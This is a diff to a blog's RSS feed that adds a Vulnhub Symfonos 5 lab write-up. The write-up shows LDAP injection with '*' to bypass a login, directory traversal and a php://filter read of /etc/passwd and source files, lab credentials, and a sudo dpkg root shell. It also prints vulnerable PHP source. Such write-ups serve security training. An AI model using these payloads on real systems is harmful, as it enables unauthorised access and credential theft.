@@ -1,21 +1,227 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>LDAP Injection on ikuamike</title>
-    <link>https://blog.ikuamike.io/tags/ldap-injection/</link>
-    <description>Recent content in LDAP Injection on ikuamike</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <copyright>© Michael Ikua</copyright>
-    <lastBuildDate>Wed, 17 Feb 2021 21:54:20 +0300</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/ldap-injection/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>Vulnhub: Symfonos 5</title>
-      <link>https://blog.ikuamike.io/posts/2021/symfonos5/</link>
-      <pubDate>Wed, 17 Feb 2021 21:54:20 +0300</pubDate>
-      
-      <guid>https://blog.ikuamike.io/posts/2021/symfonos5/</guid>
-      <description></description>
-    </item>
-    
-  </channel>
-</rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>LDAP Injection on ikuamike</title><link>https://blog.ikuamike.io/tags/ldap-injection/</link><description>Recent content in LDAP Injection on ikuamike</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>© Michael Ikua</copyright><lastBuildDate>Wed, 17 Feb 2021 21:54:20 +0300</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/ldap-injection/index.xml" rel="self" type="application/rss+xml"/><item><title>Vulnhub: Symfonos 5</title><link>https://blog.ikuamike.io/posts/2021/symfonos5/</link><pubDate>Wed, 17 Feb 2021 21:54:20 +0300</pubDate><guid>https://blog.ikuamike.io/posts/2021/symfonos5/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Difficulty&lt;/th>
+&lt;th>Release Date&lt;/th>
+&lt;th>Author&lt;/th>
+&lt;th>Machine link&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Beginner&lt;/td>
+&lt;td>2 Mar 2020&lt;/td>
+&lt;td>Zayotic&lt;/td>
+&lt;td>&lt;a href="https://vulnhub.com/entry/symfonos-52,415/">https://vulnhub.com/entry/symfonos-52,415/&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h1 id="summary">Summary&lt;/h1>
+&lt;p>In this box, we first perform ldap injection on the web application to bypass the login page. Then we are able to read
+local files by abusing a local file inclusion vulnerability with php base64 filter. From one of the php files we get
+ldap credentials that we used to authenticate to ldap and dump entries. From the entries we get a base64 encoded
+password that we could use to ssh into the machine. For privilege escalation to a root shell we abused sudo permission granted on
+dpkg.&lt;/p>
+&lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
+&lt;p>Nmap&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.191.132
+Host is up &lt;span style="color:#f92672">(&lt;/span>0.0019s latency&lt;span style="color:#f92672">)&lt;/span>.
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 &lt;span style="color:#f92672">(&lt;/span>protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
+| ssh-hostkey:
+| &lt;span style="color:#ae81ff">2048&lt;/span> 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
+| &lt;span style="color:#ae81ff">256&lt;/span> a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
+|_ &lt;span style="color:#ae81ff">256&lt;/span> 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
+80/tcp open http Apache httpd 2.4.29 &lt;span style="color:#f92672">((&lt;/span>Ubuntu&lt;span style="color:#f92672">))&lt;/span>
+|_http-server-header: Apache/2.4.29 &lt;span style="color:#f92672">(&lt;/span>Ubuntu&lt;span style="color:#f92672">)&lt;/span>
+|_http-title: Site doesn&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>t have a title &lt;span style="color:#f92672">(&lt;/span>text/html&lt;span style="color:#f92672">)&lt;/span>.
+389/tcp open ldap OpenLDAP 2.2.X - 2.3.X
+636/tcp open ldapssl?
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;h2 id="389636-ldap">389,636 (LDAP)&lt;/h2>
+&lt;p>Doing some basic enumeration on ldap without credentials we only get the domain name. We&amp;rsquo;ll probably
+get back to it incase we land on some credentials.&lt;/p>
+&lt;p>&lt;strong>nmap scripts&lt;/strong>:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nmap -p 389,636 --script ldap-* 192.168.191.132
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-2.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>&lt;strong>ldapsearch&lt;/strong>:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ldapsearch -h 192.168.191.132 -D &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span> -w &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span> -b &lt;span style="color:#e6db74">&amp;#34;DC=symfonos,DC=local&amp;#34;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-3.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;h2 id="80-http">80 (HTTP)&lt;/h2>
+&lt;p>Opening the site on the browser, we only get a plain page with an image.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-4.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Performing a directory/file bruteforce using ffuf, we discover new files.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ffuf -ic -c -u http://192.168.191.132/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e /,.php,.html -t &lt;span style="color:#ae81ff">50&lt;/span> | tee root.ffuf
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Accessing /home.php we are redirected to admin.php which has a login form.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-5.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>I tried out credential bruteforce and sql injection auth bypass techniques but none of them were successful. I
+then thought to try out ldap injection. Since we have ldap running on this host it could be a valid path.&lt;/p>
+&lt;p>The application performs authentication insecurely by using GET requests to login.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-6.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Setting the username and password to &lt;code>*&lt;/code> we successfully login.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-7.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>We get redirected to home.php which doesn&amp;rsquo;t have much, but clicking on portraits we see interesting functionality.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-8.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>The url parameter takes in a url, changing the input to &lt;code>../../../../etc/passwd&lt;/code> we can read the passwd file. This confirms
+we can abuse LFI to access other files on disk by directory traversal.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-9.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>I tried accessing log files to try for RCE like the previous boxes but nothing came up. We can still use this to read
+files so we can check the source code of the app.&lt;/p>
+&lt;p>Accessing the php files directly just executes them, so we need to use php wrappers.&lt;/p>
+&lt;p>&lt;strong>home.php&lt;/strong>&lt;/p>
+&lt;pre>&lt;code>http://192.168.191.132/home.php?url=php://filter/convert.base64-encode/resource=home.php
+&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
+&lt;span style="color:#a6e22e">session_start&lt;/span>();
+&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">isset&lt;/span>($_SESSION[&lt;span style="color:#e6db74">&amp;#39;loggedin&amp;#39;&lt;/span>])){
+&lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Location: admin.php&amp;#34;&lt;/span>);
+&lt;span style="color:#66d9ef">exit&lt;/span>;
+}
+&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#66d9ef">empty&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#34;url&amp;#34;&lt;/span>]))
+{
+$r &lt;span style="color:#f92672">=&lt;/span> $_GET[&lt;span style="color:#e6db74">&amp;#34;url&amp;#34;&lt;/span>];
+$result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">file_get_contents&lt;/span>($r);
+}
+&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;html&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;head&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34; href=&amp;#34;/static/bootstrap.min.css&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/head&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;body&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;nav class=&amp;#34;navbar navbar-expand-lg navbar-dark bg-dark&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;navbar-brand&amp;#34; href=&amp;#34;home.php&amp;#34;&amp;gt;symfonos&amp;lt;/a&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;button class=&amp;#34;navbar-toggler&amp;#34; type=&amp;#34;button&amp;#34; data-toggle=&amp;#34;collapse&amp;#34; data-target=&amp;#34;#navbarColor02&amp;#34; aria-controls=&amp;#34;navbarColor02&amp;#34; aria-expanded=&amp;#34;false&amp;#34; aria-label=&amp;#34;Toggle navigation&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;span class=&amp;#34;navbar-toggler-icon&amp;#34;&amp;gt;&amp;lt;/span&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/button&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;collapse navbar-collapse&amp;#34; id=&amp;#34;navbarColor02&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;ul class=&amp;#34;navbar-nav mr-auto&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;home.php&amp;#34;&amp;gt;Home&amp;lt;/a&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/li&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;home.php?url=http://127.0.0.1/portraits.php&amp;#34;&amp;gt;Portraits&amp;lt;/a&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/li&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;logout.php&amp;#34;&amp;gt;Logout&amp;lt;/a&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/li&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/ul&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/nav&amp;gt;&amp;lt;br /&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;center&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;?php
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">if ($result){
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">echo $result;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">} else {
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">echo &amp;#34;&amp;lt;h3&amp;gt;Under Developement&amp;lt;/h3&amp;gt;&amp;#34;;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">} ?&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/center&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/body&amp;gt;
+&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>admin.php&lt;/strong>&lt;/p>
+&lt;pre>&lt;code>http://192.168.191.132/home.php?url=php://filter/convert.base64-encode/resource=admin.php
+&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
+&lt;span style="color:#a6e22e">session_start&lt;/span>();
+&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_SESSION[&lt;span style="color:#e6db74">&amp;#34;loggedin&amp;#34;&lt;/span>]) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> $_SESSION[&lt;span style="color:#e6db74">&amp;#34;loggedin&amp;#34;&lt;/span>] &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>){
+&lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;location: home.php&amp;#34;&lt;/span>);
+&lt;span style="color:#66d9ef">exit&lt;/span>;
+}
+&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">authLdap&lt;/span>($username, $password) {
+$ldap_ch &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_connect&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;ldap://172.18.0.22&amp;#34;&lt;/span>);
+&lt;span style="color:#a6e22e">ldap_set_option&lt;/span>($ldap_ch, &lt;span style="color:#a6e22e">LDAP_OPT_PROTOCOL_VERSION&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>);
+&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>$ldap_ch) {
+&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
+}
+$bind &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_bind&lt;/span>($ldap_ch, &lt;span style="color:#e6db74">&amp;#34;cn=admin,dc=symfonos,dc=local&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;qMDdyZh3cT6eeAWD&amp;#34;&lt;/span>);
+&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>$bind) {
+&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
+}
+$filter &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;(&amp;amp;(uid=&lt;/span>&lt;span style="color:#e6db74">$username&lt;/span>&lt;span style="color:#e6db74">)(userPassword=&lt;/span>&lt;span style="color:#e6db74">$password&lt;/span>&lt;span style="color:#e6db74">))&amp;#34;&lt;/span>;
+$result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_search&lt;/span>($ldap_ch, &lt;span style="color:#e6db74">&amp;#34;dc=symfonos,dc=local&amp;#34;&lt;/span>, $filter);
+&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>$result) {
+&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
+}
+$info &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_get_entries&lt;/span>($ldap_ch, $result);
+&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>($info) &lt;span style="color:#f92672">||&lt;/span> ($info[&lt;span style="color:#e6db74">&amp;#34;count&amp;#34;&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)) {
+&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
+}
+&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">TRUE&lt;/span>;
+}
+&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;username&amp;#39;&lt;/span>]) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;password&amp;#39;&lt;/span>])){
+$username &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">urldecode&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;username&amp;#39;&lt;/span>]);
+$password &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">urldecode&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;password&amp;#39;&lt;/span>]);
+$bIsAuth &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">authLdap&lt;/span>($username, $password);
+&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span> $bIsAuth ) {
+$msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Invalid login&amp;#34;&lt;/span>;
+} &lt;span style="color:#66d9ef">else&lt;/span> {
+$_SESSION[&lt;span style="color:#e6db74">&amp;#34;loggedin&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
+&lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;location: home.php&amp;#34;&lt;/span>);
+&lt;span style="color:#66d9ef">exit&lt;/span>;
+}
+}
+&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;html&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;head&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34; href=&amp;#34;/static/bootstrap.min.css&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/head&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;body&amp;gt;&amp;lt;br /&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;row justify-content-center&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-8&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;card&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;card-header&amp;#34;&amp;gt;Login&amp;lt;/div&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;card-body&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;form action=&amp;#34;admin.php&amp;#34; method=&amp;#34;GET&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;form-group row&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;label for=&amp;#34;email_address&amp;#34; class=&amp;#34;col-md-4 col-form-label text-md-right&amp;#34;&amp;gt;Username&amp;lt;/label&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-6&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;input type=&amp;#34;text&amp;#34; id=&amp;#34;username&amp;#34; class=&amp;#34;form-control&amp;#34; name=&amp;#34;username&amp;#34; required autofocus&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;form-group row&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;label for=&amp;#34;password&amp;#34; class=&amp;#34;col-md-4 col-form-label text-md-right&amp;#34;&amp;gt;Password&amp;lt;/label&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-6&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;input type=&amp;#34;password&amp;#34; id=&amp;#34;password&amp;#34; class=&amp;#34;form-control&amp;#34; name=&amp;#34;password&amp;#34; required&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-6 offset-md-4&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;button type=&amp;#34;submit&amp;#34; class=&amp;#34;btn btn-primary&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> Login
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/button&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/form&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;center&amp;gt;&amp;lt;strong&amp;gt;&amp;lt;?php echo $msg; ?&amp;gt;&amp;lt;/strong&amp;gt;&amp;lt;/center&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/div&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/body&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/html&amp;gt;
+&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>From admin.php we get credentials that can be used on ldap.&lt;/p>
+&lt;h1 id="getting-shell-as-zeus">Getting shell as zeus&lt;/h1>
+&lt;p>With the credentials admin:qMDdyZh3cT6eeAWD, we get more output from ldap:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ldapsearch -x -h 192.168.191.132 -D &lt;span style="color:#e6db74">&amp;#34;CN=admin,DC=symfonos,DC=local&amp;#34;&lt;/span> -w qMDdyZh3cT6eeAWD -b &lt;span style="color:#e6db74">&amp;#34;DC=symfonos,DC=local&amp;#34;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-10.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>From the output, the userPassword is base64 encoded. After decoding it we get &lt;code>cetkKf4wCuHC9FET&lt;/code> and can login
+as zeus via ssh.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-11.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;h1 id="privilege-escalation">Privilege Escalation&lt;/h1>
+&lt;p>Running &lt;code>sudo -l&lt;/code>, we see that zeus has sudo permissions to run dpkg with no password.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-12.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>From &lt;a href="https://gtfobins.github.io/gtfobins/dpkg/" target="_blank" rel="noopener">gtfobins&lt;/a>
+we only need to execute the below commands to
+abuse this.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo dpkg -l
+!/bin/bash
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-13.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;h1 id="extras">Extras&lt;/h1>
+&lt;p>When accessing the passwd file, we couldn&amp;rsquo;t see any user with home directory in /home looking at the configuration
+postexploitation we see that the services are running in docker containers.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-14.png" alt="symfonos" class="center" style="border-radius: 8px;" /></content></item></channel></rss>
